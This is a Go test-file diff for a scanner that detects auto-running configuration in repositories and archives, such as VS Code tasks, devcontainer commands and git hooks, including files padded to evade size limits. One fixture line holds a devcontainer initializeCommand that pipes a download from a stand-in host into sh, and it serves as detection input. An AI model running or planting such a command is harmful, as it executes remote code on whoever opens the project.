@@ -272,6 +272,45 @@ func TestAnalyze(t *testing.T) {
 	}
 }
 
+func TestAnalyzeMemberPath(t *testing.T) {
+	const initCmd = `{"initializeCommand": "curl https://a.test/x | sh"}`
+	tests := []struct {
+		name string
+		// inputs
+		path   string
+		member string
+		depth  int
+		data   string
+		// expectations: "<rule suffix>:<line>" of the primary evidence
+		want []string
+	}{
+		{name: "member of a container is matched by its path in the container", path: "my!/x.zip!/.vscode/tasks.json", member: ".vscode/tasks.json", depth: 1, data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
+		{name: "member in a directory called x! is matched by its whole path in the container", path: "x.zip!/repo/.devcontainer/py!/devcontainer.json", member: "repo/.devcontainer/py!/devcontainer.json", depth: 1, data: initCmd, want: []string{"003:1", "011:1"}},
+		{name: "directory on disk called x! is matched whole", path: ".devcontainer/py!/devcontainer.json", depth: 0, data: initCmd, want: []string{"003:1", "011:1"}},
+		{name: "file on disk is not cut at a separator in a directory name", path: "app!/.vscode/tasks.json", depth: 0, data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
+		{name: "member whose path in the container names nothing", path: "x.zip!/readme.txt", member: "readme.txt", depth: 1, data: initCmd},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			f := analyze.File{Path: tt.path, Name: tt.path[strings.LastIndex(tt.path, "/")+1:], Data: []byte(tt.data), Depth: tt.depth, Member: tt.member}
+
+			out, err := autoexec.New().Analyze(context.Background(), f)
+
+			if err != nil {
+				t.Fatal(err)
+			}
+			var got []string
+			for _, fi := range out.Findings {
+				got = append(got, fmt.Sprintf("%s:%d", strings.TrimPrefix(fi.RuleID, "GAL-AUTOEXEC-"), fi.Evidence[0].Line))
+			}
+			slices.Sort(got)
+			if !slices.Equal(got, tt.want) {
+				t.Errorf("findings = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
+
 func TestAnalyzeSkips(t *testing.T) {
 	tests := []struct {
 		name string
@@ -284,7 +323,8 @@ func TestAnalyzeSkips(t *testing.T) {
 		{name: "json that does not parse", path: ".vscode/tasks.json", data: `{"tasks": [`, wantReason: "parse_error"},
 		{name: "json root is not an object", path: "package.json", data: `[1]`, wantReason: "parse_error"},
 		{name: "json nested too deep", path: "package.json", data: strings.Repeat("[", 200) + strings.Repeat("]", 200), wantReason: "parse_error"},
-		{name: "config larger than the limit", path: ".husky/pre-commit", data: strings.Repeat("#", analyze.MaxConfigSize+1), wantReason: "too_large"},
+		{name: "config larger than the limit", path: ".husky/pre-commit", data: strings.Repeat("#", analyze.MaxConfigSize+1), wantReason: "budget"},
+		{name: "tasks file larger than the limit hides behind its padding", path: ".vscode/tasks.json", data: "//" + strings.Repeat("#", analyze.MaxConfigSize) + "\n" + tasksFolderOpen, wantReason: "budget"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -310,7 +350,7 @@ func TestAnalyzePaddedPnpmfile(t *testing.T) {
 		want       []string
 		wantReason string
 	}{
-		{name: "pnpmfile larger than the limit is still reported", path: ".pnpmfile.cjs", data: strings.Repeat("/", analyze.MaxConfigSize+1), want: []string{"015:1"}, wantReason: "too_large"},
+		{name: "pnpmfile larger than the limit is still reported", path: ".pnpmfile.cjs", data: strings.Repeat("/", analyze.MaxConfigSize+1), want: []string{"015:1"}, wantReason: "budget"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -318,6 +358,74 @@ func TestAnalyzePaddedPnpmfile(t *testing.T) {
 
 			if !slices.Equal(got, tt.want) {
 				t.Errorf("findings = %v, want %v", got, tt.want)
+			}
+			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
+				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
+			}
+		})
+	}
+}
+
+// padded returns head followed by zeros, one byte over the config size limit.
+func padded(head []byte) string {
+	return string(head) + strings.Repeat("\x00", analyze.MaxConfigSize+1-len(head))
+}
+
+// elfHeader is the header of an ELF64 file with no sections or segments, which debug/elf reads.
+func elfHeader() []byte {
+	h := make([]byte, 64)
+	copy(h, "\x7fELF\x02\x01\x01")
+	h[16], h[18], h[20], h[52], h[54], h[58] = 2, 62, 1, 64, 56, 64 // type, machine, version, sizes of the header and its entries
+	return h
+}
+
+// machoHeader is the header of a 64-bit Mach-O file with no load commands.
+func machoHeader() []byte {
+	h := make([]byte, 32)
+	copy(h, "\xcf\xfa\xed\xfe")
+	h[4], h[7], h[12] = 12, 1, 2 // arm64, executable
+	return h
+}
+
+// peHeader is a DOS header that points at a PE header with no sections.
+func peHeader() []byte {
+	h := make([]byte, 0x80)
+	copy(h, "MZ")
+	h[0x3c] = 0x40
+	copy(h[0x40:], "PE\x00\x00")
+	h[0x44], h[0x45] = 0x64, 0x86 // amd64
+	return h
+}
+
+func TestAnalyzeOversizeExecutable(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		path string
+		data string
+		// expectations
+		wantReason string
+	}{
+		{name: "copied ELF interpreter in a virtualenv is too large and not a hidden payload", path: ".venv/bin/python", data: padded(elfHeader()), wantReason: "too_large"},
+		{name: "native Mach-O tool in node_modules/.bin", path: "node_modules/.bin/esbuild", data: padded(machoHeader()), wantReason: "too_large"},
+		{name: "Windows launcher in a virtualenv", path: "venv/Scripts/python.exe", data: padded(peHeader()), wantReason: "too_large"},
+		{name: "script in a virtualenv hides behind its size", path: ".venv/bin/activate", data: padded([]byte("#!/bin/sh\n")), wantReason: "budget"},
+		{name: "script that starts with the ELF magic is not an executable", path: ".venv/bin/activate", data: padded([]byte("\x7fELF\x02\x01\x01\n")), wantReason: "budget"},
+		{name: "PE magic alone is not an executable", path: ".venv/Scripts/activate.bat", data: padded([]byte("MZ\n")), wantReason: "budget"},
+		{name: "husky hook that starts with the ELF magic still hides", path: ".husky/pre-commit", data: padded([]byte("\x7fELF\x02\x01\x01\n")), wantReason: "budget"},
+		{name: "real ELF as a husky hook still hides, since git runs it", path: ".husky/pre-commit", data: padded(elfHeader()), wantReason: "budget"},
+		{name: "husky generated file with the ELF magic still hides", path: ".husky/_/pre-commit", data: padded([]byte("\x7fELF\x02\x01\x01\n")), wantReason: "budget"},
+		{name: "real ELF in the husky generated directory still hides", path: ".husky/_/pre-commit", data: padded(elfHeader()), wantReason: "budget"},
+		{name: "real ELF named like a tasks file still hides", path: ".vscode/tasks.json", data: padded(elfHeader()), wantReason: "budget"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			f := analyze.File{Path: tt.path, Name: tt.path[strings.LastIndex(tt.path, "/")+1:], Data: []byte(tt.data)}
+
+			out, err := autoexec.New().Analyze(context.Background(), f)
+
+			if err != nil {
+				t.Fatal(err)
 			}
 			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
 				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
@@ -445,6 +553,57 @@ func TestStripJSONC(t *testing.T) {
 
 			if got != tt.want {
 				t.Errorf("StripJSONC(%q) = %q, want %q", tt.in, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestPriority(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		path string
+		// expectations
+		wantPriority bool
+	}{
+		{name: "VS Code tasks file", path: "src/.vscode/tasks.json", wantPriority: true},
+		{name: "tasks.json outside .vscode", path: "src/tasks.json", wantPriority: false},
+		{name: "workspace file", path: "app.code-workspace", wantPriority: true},
+		{name: "VS Code settings", path: ".vscode/settings.json", wantPriority: true},
+		{name: "devcontainer file", path: ".devcontainer/devcontainer.json", wantPriority: true},
+		{name: "package.json", path: "pkg/package.json", wantPriority: true},
+		{name: "husky hook", path: ".husky/pre-commit", wantPriority: true},
+		{name: "husky generated file", path: ".husky/_/h", wantPriority: true},
+		{name: "pre-commit config", path: ".pre-commit-config.yaml", wantPriority: true},
+		{name: "git config", path: ".git/config", wantPriority: true},
+		{name: ".npmrc", path: "app/.npmrc", wantPriority: true},
+		{name: ".yarnrc", path: ".yarnrc", wantPriority: true},
+		{name: ".yarnrc.yml", path: ".yarnrc.yml", wantPriority: true},
+		{name: ".pnpmfile.cjs", path: ".pnpmfile.cjs", wantPriority: true},
+		{name: ".pnpmfile.mjs", path: ".pnpmfile.mjs", wantPriority: true},
+		{name: "Prisma schema", path: "prisma/schema.prisma", wantPriority: true},
+		{name: "binding.gyp", path: "binding.gyp", wantPriority: true},
+		{name: "common.gypi", path: "deps/common.gypi", wantPriority: true},
+		{name: "setup.py", path: "setup.py", wantPriority: true},
+		{name: "pyproject.toml", path: "pyproject.toml", wantPriority: true},
+		{name: ".envrc", path: ".envrc", wantPriority: true},
+		{name: "Makefile only lists automation", path: "build/Makefile", wantPriority: false},
+		{name: "CI workflow only lists automation", path: ".github/workflows/ci.yml", wantPriority: false},
+		{name: "build.rs only lists automation", path: "build.rs", wantPriority: false},
+		{name: "directory on disk called x!", path: ".devcontainer/py!/devcontainer.json", wantPriority: true},
+		{name: "package manager output", path: "node_modules/.bin/tool", wantPriority: true},
+		{name: "member of a container is matched by its member path", path: "repo.zip!/.vscode/tasks.json", wantPriority: true},
+		{name: "package.json inside node_modules", path: "node_modules/dep/package.json", wantPriority: false},
+		{name: "ordinary source file", path: "src/main.go", wantPriority: false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			p, ok := autoexec.New().(analyze.Priority)
+			if !ok {
+				t.Fatal("analyzer does not implement analyze.Priority")
+			}
+			if got := p.Priority(tt.path); got != tt.wantPriority {
+				t.Errorf("Priority(%q) = %v, want %v", tt.path, got, tt.wantPriority)
 			}
 		})
 	}
